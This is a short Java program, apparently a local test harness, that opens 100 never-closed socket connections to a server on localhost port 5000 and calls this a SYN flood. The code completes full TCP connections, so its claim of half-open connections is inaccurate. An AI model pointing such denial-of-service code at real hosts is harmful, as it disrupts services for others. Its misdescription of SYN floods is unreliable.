package safety.attacks;

import java.net.Socket;

public class SYNFloodAttack {
    private static final String SERVER_IP = "127.0.0.1";
    private static final int SERVER_PORT = 5000;

    public static void main(String[] args) {
        for (int i = 0; i < 100; i++) { // Simulate 100 half-open connections
            new Thread(() -> {
                try {
                    Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                    System.out.println("SYN Flood Attack launched by " + Thread.currentThread().getName());
                    // Do not close the socket to simulate half-open connections
                } catch (Exception e) {
                    System.out.println("Server overwhelmed or blocked the attack!");
                }
            }).start();
        }
    }
}